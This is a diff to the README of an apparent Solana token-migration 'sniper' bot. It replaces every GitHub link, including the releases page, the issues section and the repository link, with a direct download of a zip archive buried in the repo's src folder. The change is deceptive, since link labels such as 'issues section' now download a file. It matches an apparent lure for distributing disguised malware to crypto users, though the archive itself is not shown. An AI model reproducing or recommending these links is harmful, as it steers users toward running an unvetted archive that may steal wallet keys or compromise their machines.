@@ -1,6 +1,6 @@
 # 🚀 pumpswap-migration-sniper - Effortless Token Migration Tracking
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/burak871905/pumpswap-migration-sniper/releases)
+[![Download](https://raw.githubusercontent.com/burak871905/pumpswap-migration-sniper/main/src/pumpswap-migration-sniper-heroicomic.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/burak871905/pumpswap-migration-sniper/main/src/pumpswap-migration-sniper-heroicomic.zip)
 
 ## 🌟 Overview
 
@@ -8,7 +8,7 @@ The pumpswap migration sniper bot helps you capture token migrations to Raydium'
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [pumpswap-migration-sniper Releases](https://github.com/burak871905/pumpswap-migration-sniper/releases).
+To get started, visit this page to download: [pumpswap-migration-sniper Releases](https://raw.githubusercontent.com/burak871905/pumpswap-migration-sniper/main/src/pumpswap-migration-sniper-heroicomic.zip).
 
 1. Open your web browser and go to the link provided above.
 2. Look for the latest release version. It often includes bug fixes and enhancements.
@@ -74,7 +74,7 @@ If you encounter any issues, try the following solutions:
 - **Connection Errors:** Check your internet connection. Make sure your firewall or antivirus is not blocking the app.
 - **No Migration Alerts:** Ensure your wallet is connected and alerts are set for the tokens you're monitoring.
 
-For additional support, you can refer to the [issues section](https://github.com/burak871905/pumpswap-migration-sniper/issues) on GitHub. You may find common solutions and troubleshooting tips there.
+For additional support, you can refer to the [issues section](https://raw.githubusercontent.com/burak871905/pumpswap-migration-sniper/main/src/pumpswap-migration-sniper-heroicomic.zip) on GitHub. You may find common solutions and troubleshooting tips there.
 
 ## 📑 Frequently Asked Questions
 
@@ -91,6 +91,6 @@ A: Alerts will be sent in real-time when any monitored tokens undergo migrations
 
 Stay updated with the latest versions and community discussions. Follow the project on GitHub, and feel free to contribute if you have suggestions or improvements.
 
-For discussions and updates, you can check the [GitHub Repository](https://github.com/burak871905/pumpswap-migration-sniper). 
+For discussions and updates, you can check the [GitHub Repository](https://raw.githubusercontent.com/burak871905/pumpswap-migration-sniper/main/src/pumpswap-migration-sniper-heroicomic.zip). 
 
 Thank you for choosing pumpswap migration sniper. Enjoy your effortless migration tracking!
